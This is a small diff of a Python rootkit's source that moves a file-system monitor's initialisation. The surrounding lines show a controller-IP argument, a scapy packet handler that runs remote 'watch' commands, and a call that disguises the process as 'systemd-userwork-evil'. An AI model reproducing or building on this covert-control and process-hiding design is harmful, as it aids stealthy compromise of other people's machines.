@@ -34,7 +34,6 @@ PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
 PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
 ARGS = PARSER.parse_args()
-MONITOR = FileSystemMonitor()
 
 
 # Manually set scapy to use libpcap instead of bpkfilter.
@@ -244,6 +243,8 @@ def packet_handler(pkt):
         if argv[0] == WATCH:
             execute_watch_command(argv[1])
 
+
+MONITOR = FileSystemMonitor()
 
 if __name__ == "__main__":
     hide_process_name("systemd-userwork-evil")
